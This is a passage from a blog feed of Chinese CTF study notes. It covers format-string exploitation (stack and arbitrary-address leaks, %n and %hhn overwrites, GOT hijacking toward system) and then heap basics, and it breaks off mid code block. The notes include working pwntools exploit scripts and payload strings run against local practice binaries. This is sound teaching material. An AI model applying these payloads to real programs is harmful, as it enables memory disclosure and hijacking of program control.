href="#常见格式化字符串函数" class="headerlink" title="常见格式化字符串函数"></a>常见格式化字符串函数</h3><p><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1733328075199.png" alt="常见函数"></p><h2 id="格式化字符串的利用"><a href="#格式化字符串的利用" class="headerlink" title="格式化字符串的利用"></a>格式化字符串的利用</h2><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><h5 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h5><p>理论依据：格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取) </p><p>这里以32位举例说明</p><p><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1733760093914.png" alt="main"></p><p>运行查看结果</p><p><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1733760198590.png" alt="结果"></p><p>gdb调试，断点下在两个printf处，查看栈上信息</p><p>第一个printf处</p><p><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1733760238293.png" alt="gdb"></p><p>可以看到 栈中第一个变量（esp）为返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们**输入的格式化字符串对应的地址 **</p><p>继续运行</p><p><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1733760387677.png" alt="gdb"></p><p> 程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出 。</p><p>但上述输出需要输入很多个%x%x，如果<strong>需要获取某个参数，可以直接 %n$x</strong> ，这个n就是栈上的参数相对于格式化字符串的偏移，例如上面图片的0xffffcd0c就是%3$x，当然也可以%p来获取地址</p><p><strong>需要快速获取位移的话就可以来利用利用原理篇的gdb</strong></p><h4 id="获取栈变量对于字符串"><a href="#获取栈变量对于字符串" class="headerlink" title="获取栈变量对于字符串"></a>获取栈变量对于字符串</h4><p>就是%s，将对应处的变量解析为字符串地址进行输出</p><p><strong>如果不能被解析为字符串变量，则程序会崩溃</strong></p><p>所以快速让程序崩溃的一个办法就是输入一大串%s%s….</p><h4 id="小技巧总结"><a href="#小技巧总结" class="headerlink" title="小技巧总结"></a>小技巧总结</h4><ol><li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li><li>利用 %s 来获取变量所对应地址的内容，只不过有<strong>零截断</strong>。</li><li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li></ol><h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p> &#x3D;完全控制泄露<strong>某个指定地址的内存</strong> </p><p>方法：获取<strong>某个addr的内容</strong>：<code>addr%k$s</code>这里的k是该格式化字符相对函数调用的第k个参数</p><p>那么想办法确认k就好了</p><p><strong>方法：</strong></p><p>输入[tag]%p%p%p%p%p查看哪个%p跟tag一样（比如aaaa%p%p%p%p%p）</p><p><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1734022426662.png" alt="结果"></p><p>0x41414141跟我输入的AAAA一样，是<strong>格式化字符串的第4个参数</strong>所以k&#x3D;4即可输出该地址上的内容</p><p><strong>应用：</strong></p><ol><li><p>获取真实地址  例如获取scanf</p><ul><li><p>获取scanf@got<br><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1734022850762.png" alt="got表"><br>gdb也是输入got\n就可以了</p></li><li><p>然后就scanf@got%4$s就可以输出got真实地址了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>leakmemory = ELF(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>__isoc99_scanf_got = leakmemory.got[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(__isoc99_scanf_got)<br>payload = p32(__isoc99_scanf_got) + <span class="hljs-string">&#x27;%4$s&#x27;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;%4$s\n&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])) <span class="hljs-comment"># remove the first bytes of __isoc99_scanf@got 意思是会先将scanf@got打印出来然后才是scanf真实地址所以要接收后4字节</span><br>sh.interactive()<br></code></pre></td></tr></table></figure></li></ul></li></ol><p><strong>注意：</strong></p><p>并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。 </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[padding]</span><span class="hljs-selector-attr">[addr]</span><br></code></pre></td></tr></table></figure><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p> 修改栈上变量的值，甚至修改任意地址变量的内存 </p><p>方法：<code>%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</code></p><p>以如下代码为例：(32)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">/* example/overflow/overflow.c */<br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-built_in">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-built_in">int</span> main() &#123;<br>  <span class="hljs-built_in">int</span> c = <span class="hljs-number">789</span>;<br>  char s[<span class="hljs-number">100</span>];<br>  printf(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  scanf(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  printf(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    puts(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    puts(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    puts(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>基本payload格式：</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">...[overwrite addr]....%[overwrite <span class="hljs-built_in">offset</span>]$<span class="hljs-built_in">n</span><br></code></pre></td></tr></table></figure><p> 其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数 </p><p><strong>一般步骤：</strong></p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><p>目的：进入第一个if语句</p><ol><li><p>地址：</p><p>上面程序有打印c的地址，直接用即可</p></li><li><p>偏移：</p><p>gdb调试</p><p><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1734091929291.png" alt="gdb"></p><p>发现是第6个参数，所以是%6$n</p></li><li><p>覆盖</p><p>payload如下</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[addr of <span class="hljs-keyword">c</span>]<span class="hljs-variable">%012</span>d<span class="hljs-variable">%6</span>$n<br></code></pre></td></tr></table></figure><p>因为addr of c栈4字节，所以再补充12个字节即可将c覆盖成16</p></li></ol><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>c_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(c_addr)<br>payload = p32(c_addr) + <span class="hljs-string">&#x27;%012d&#x27;</span> + <span class="hljs-string">&#x27;%6$n&#x27;</span><br><span class="hljs-built_in">print</span> payload<br><span class="hljs-comment">#gdb.attach(sh)</span><br>sh.sendline(payload)<br><span class="hljs-built_in">print</span> sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>问题：当我需要覆盖的数字小于4&#x2F;8时，会导致覆盖失败，因为addr of a就占了4字节</p><p>解决：没有必要一定将addr放在最前面，只要知道偏移即可</p><p>当我们将a覆盖为2时，格式必须是</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">aa<span class="hljs-built_in">%k</span><span class="hljs-built_in">$nxxxxx</span>(xxx是后面的内容)<br></code></pre></td></tr></table></figure><p>围绕这个展开</p><ol><li><p>确定地址<br><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1734095378872.png" alt="IDA"></p></li><li><p>确定偏移<br>aa%k$n已经占了6字节，在覆盖栈内存时可知偏移为6，这里我们构造成aa%k$aa这样就占了8字节，刚好占2，所以将上面的偏移往后推2即可，可得出k为8</p></li><li><p>进行覆盖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>a_addr = <span class="hljs-number">0x0804A024</span><br>payload = <span class="hljs-string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)<br>sh.sendline(payload)<br><span class="hljs-built_in">print</span> sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure></li></ol><h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><p><strong>变量在内存中的存储格式：</strong></p><p> 首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。 </p><p>types：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">hh 对于整数类型，printf期待一个从<span class="hljs-type">char</span>提升的<span class="hljs-type">int</span>尺寸的整型参数。<br>h  对于整数类型，printf期待一个从<span class="hljs-type">short</span>提升的<span class="hljs-type">int</span>尺寸的整型参数。<br></code></pre></td></tr></table></figure><p>所以可利用%hhn向某个地址写入单字节，利用%hn向某个地址写入双字节</p><ol><li><p>确定覆盖的地址<br><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1734096669149.png" alt="IDA"></p><p>如何覆盖<br><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1734096681348.png" alt="^^"></p></li><li><p>确定偏移<br>由覆盖栈内存可得出偏移是6</p><p>payload格式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x0804A028)</span></span>+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>x0804A029)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>x0804A02a)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>x0804A02b)+pad1+<span class="hljs-string">&#x27;%6$hhn&#x27;</span>+pad2+<span class="hljs-string">&#x27;%7$hhn&#x27;</span>+pad3+<span class="hljs-string">&#x27;%8$hhn&#x27;</span>+pad4+<span class="hljs-string">&#x27;%9$hhn&#x27;</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h3><p> 在目前的 C 程序中，libc 中的函数都是通过<strong>GOT 表来跳转</strong>的。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是<strong>可以被修改的</strong>  因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如<strong>说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</strong> </p><p>加入将函数A的地址覆盖为函数B的地址，有如下步骤：</p><ul><li><p>确定函数 A 的 GOT 表地址。</p><ul><li>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</li></ul></li><li><p>确定函数 B 的内存地址</p><ul><li>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</li></ul></li><li><p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p><ul><li><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p><ul><li><p>写入函数：write 函数。</p></li><li><p>ROP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pop eax; ret;           <span class="hljs-comment"># printf@got -&gt; eax</span><br>pop ebx; ret;           <span class="hljs-comment"># (addr_offset = system_addr - printf_addr) -&gt; ebx</span><br>add [eax] ebx; ret;     <span class="hljs-comment"># [printf@got] = [printf@got] + addr_offset</span><br></code></pre></td></tr></table></figure></li><li><p>格式化字符串任意地址写</p></li></ul></li></ul></li><li><p>payload &#x3D; fmtstr_payload(offset,{printf_got:system_plt}) 用来将地址替换掉，这里是将printf_got替换成为system_plt，offset是格式化字符串的偏移</p><p>这个是专门为<strong>32位</strong>程序格式化字符串漏洞输出payload的一个函数</p></li></ul><h3 id="hijack-retadder"><a href="#hijack-retadder" class="headerlink" title="hijack retadder"></a>hijack retadder</h3><p>利用格式化字符串来控制程序的返回地址（可能是用在开了RELRO，无法修改got的情况？）</p><p>思路：</p><p> 存储返回地址的内存本身是动态变化的，但是其相对于 rbp 的地址并不会改变，所以我们可以使用相对地址来计算</p><ul><li>确定偏移</li><li>获取函数的 rbp 与返回地址</li><li>根据相对偏移获取存储返回地址的地址</li><li>将执行 system 函数调用的地址写入到存储返回地址的地址。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>格式化字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆</title>
    <link href="/2025/01/28/%E5%A0%86/"/>
    <url>/2025/01/28/%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><h2 id="堆简介"><a href="#堆简介" class="headerlink" title="堆简介"></a>堆简介</h2><p> 提供<strong>动态分配</strong>的内存      </p><p> 堆其实就是程序虚拟地址空间的一块<strong>连续</strong>的线性区域，它由<strong>低地址向高地址方向增长</strong>（栈是高地址向低地址）。我们一般称管理堆的那部分程序为堆管理器。 </p><p><strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>  所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户<strong>使用到</strong>相应的内存时，系统才会真正分配物理页面给用户使用。 </p><h2 id="堆基本操作"><a href="#堆基本操作" class="headerlink" title="堆基本操作"></a>堆基本操作</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>原型：<code>void *malloc(size_t size);</code></p><p>对异常状况的处理：</p><ul><li>当 n&#x3D;0 时，返回当前系统允许的堆的最小内存块。</li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p> free(void* p) </p><p>此外，该函数也同样对异常情况进行了处理</p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间<strong>还给系统</strong>，以便于减小程序所使用的内存空间。</li></ul><h3 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h3><p>无论是maclloc还是free都<strong>不是</strong>直接与系统交互的函数，这些函数背后的调用主要是(s)brk函数和mmap,munmap函数</p><p>当使用内存块申请操作时</p><p><img src="/2025/01/28/%E5%A0%86/1735202994948.png" alt="系统调用"></p><h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加brk 的大小来向操作系统申请内存。 </p><p>初始时，堆的起始地址start_brk以及堆的当前末尾 brk指向<strong>同一地址</strong>。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向<strong>data&#x2F;bss 段的结尾</strong>。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data&#x2F;bss 段结尾后的<strong>随机偏移处</strong>。</li></ul><p><img src="/2025/01/28/%E5%A0%86/1735203153769.png" alt="结构"></p><p>brk和sbrk</p><p><code>sbrk</code>和<code>brk</code>是UNIX和类UNIX操作系统中用于管理进程数据段（堆）的两个系统调用。它们都用于改变进程的堆大小，但它们的使用方式和行为有所不同。</p><h5 id="sbrk函数"><a href="#sbrk函数" class="headerlink" title="sbrk函数"></a><code>sbrk</code>函数</h5><p><code>sbrk</code>函数用于申请或释放堆内存。它的原型是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">sbrk</span><span class="hljs-params">(<span class="hljs-type">intptr_t</span> increment)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>increment</code>：指定堆应该增加或减少的字节数。正值表示增加堆的大小，负值表示减少堆的大小。</li><li>返回值：<code>sbrk</code>返回新的堆顶地址。</li></ul><p><code>sbrk</code>的工作方式是将堆顶（program break）向上或向下移动指定的字节数。如果<code>increment</code>是正数，堆增长；如果是负数，堆缩小。<code>sbrk</code>的返回值是操作前的堆顶地址。</p><h5 id="brk函数"><a href="#brk函数" class="headerlink" title="brk函数"></a><code>brk</code>函数</h5><p><code>brk</code>函数用于设置堆的上限。它的原型是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">brk</span><span class="hljs-params">(<span class="hljs-type">void</span> *end_data_segment)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>end_data_segment</code>：指定新的堆顶地址。</li><li>返回值：<code>brk</code>返回0表示成功，或者在出错时返回-1。</li></ul><p><code>brk</code>将堆顶设置为指定的地址。如果新的堆顶低于当前堆中已分配的内存（即堆缩小），<code>brk</code>可能会失败并返回-1。如果新的堆顶高于当前堆的大小（即堆增长），操作系统可能会分配更多的内存。</p><h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><ol><li><p><strong>操作方式</strong>：</p><ul><li><code>sbrk</code>通过指定要增加或减少的字节数来改变堆的大小。</li><li><code>brk</code>直接设置堆的新上限地址。</li></ul></li><li><p><strong>返回值</strong>：</p><ul><li><code>sbrk</code>返回操作前的堆顶地址。</li><li><code>brk</code>返回0表示成功，返回-1表示失败。</li></ul></li><li><p><strong>行为</strong>：</p><ul><li><code>sbrk</code>在增加堆时，如果新的堆顶超过了系统为进程分配的最大堆大小，<code>sbrk</code>会失败。</li><li><code>brk</code>在设置堆顶时，如果新的堆顶低于已分配的内存，<code>brk</code>会失败。</li></ul></li></ol><p>在现代操作系统中，<code>malloc</code>和<code>free</code>等高级内存管理函数通常是基于<code>sbrk</code>和<code>brk</code>实现的，但在大多数情况下，程序员不需要直接使用<code>sbrk</code>和<code>brk</code>，而是使用这些更高级的抽象。</p><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* sbrk and brk example */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">void</span> *curr_brk, *tmp_brk = <span class="hljs-literal">NULL</span>;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());<br><br>        <span class="hljs-comment">/* sbrk(0) gives current program break location */</span><br>        tmp_brk = curr_brk = sbrk(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//这里使这两个变量都是堆的初始地址，这里还没有出现堆</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);<br>        getchar();<br><br>        <span class="hljs-comment">/* brk(addr) increments/decrements program break location */</span><br>        brk(curr_brk+<span class="hljs-number">4096</span>);<br><span class="hljs-comment">//开始出现堆，大小位4kb</span><br>        curr_brk = sbrk(<span class="hljs-number">0</span>);<span class="hljs-comment">//sbrk本质是向上或向下控制堆的大小并返回结果地址，这里传参数0就是不对堆做任何的大小上的改变，返回的地址也就是此时堆顶部的地址了</span><br><span class="hljs-comment">//这里获取此时堆顶部的地址</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);<br>        getchar();<br><br>        brk(tmp_brk);<br><span class="hljs-comment">//释放堆</span><br>        curr_brk = sbrk(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);<br>        getchar();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mmap</code> 和 <code>munmap</code> 是在 Unix 和类 Unix 操作系统中用于内存管理的两个系统调用，它们允许程序映射文件或设备到进程的地址空间，以及撤销这种映射。这些调用通常用于实现内存映射文件，这是一种高效的文件 I&#x2F;O 方法，也可以用于动态内存分配。</p><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><h5 id="mmap-1"><a href="#mmap-1" class="headerlink" title="mmap"></a><code>mmap</code></h5><p><code>mmap</code> 系统调用用于将一个文件或者其他对象映射到进程的地址空间。这允许程序像访问普通内存一样访问文件内容，而不需要使用传统的 read 和 write 系统调用。<code>mmap</code> 的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>addr</code>：映射区域的起始地址，通常设置为 NULL 让系统选择地址。</li><li><code>length</code>：映射区域的长度。</li><li><code>prot</code>：映射区域的保护方式，可以是以下几种方式的组合：PROT_EXEC（可执行）、PROT_READ（可读）、PROT_WRITE（可写）、PROT_NONE（不可访问）。</li><li><code>flags</code>：映射类型和属性的标志，常用的标志包括 MAP_SHARED（对映射区域的修改会反映到文件上）、MAP_PRIVATE（私有的copy-on-write映射）、MAP_ANONYMOUS（匿名映射，不与任何文件关联）等。</li><li><code>fd</code>：被映射文件的文件描述符，如果是匿名映射则设置为 -1。</li><li><code>offset</code>：文件映射的起始位置，通常为文件大小的整数倍。</li></ul><p><code>mmap</code> 返回值是映射区域的起始地址，如果失败则返回 MAP_FAILED（通常是(void *)-1）。</p><h5 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a><code>munmap</code></h5><p><code>munmap</code> 系统调用用于撤销由 <code>mmap</code> 创建的内存映射。<code>munmap</code> 的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>addr</code>：要撤销映射的起始地址。</li><li><code>length</code>：要撤销映射的长度，必须与原始 <code>mmap</code> 调用时的长度一致。</li></ul><p><code>munmap</code> 返回值是 0 表示成功，-1 表示失败，并设置 errno 以指示错误原因。</p><h5 id="区别和用途"><a href="#区别和用途" class="headerlink" title="区别和用途"></a>区别和用途</h5><ul><li><code>mmap</code> 用于创建内存映射，可以用于文件 I&#x2F;O、动态内存分配、共享内存等。</li><li><code>munmap</code> 用于撤销已有的内存映射，释放之前 <code>mmap</code> 分配的内存空间。</li><li>使用 <code>mmap</code> 和 <code>munmap</code> 可以提高程序的性能，因为它们允许程序直接在内存中读写文件内容，减少了数据复制的开销。</li><li><code>mmap</code> 还可以用于实现跨进程的内存共享，因为多个进程可以映射同一个文件，从而共享文件内容。</li><li><code>munmap</code> 必须在不再需要映射时调用，以避免内存泄漏。</li></ul><p><strong>例子</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 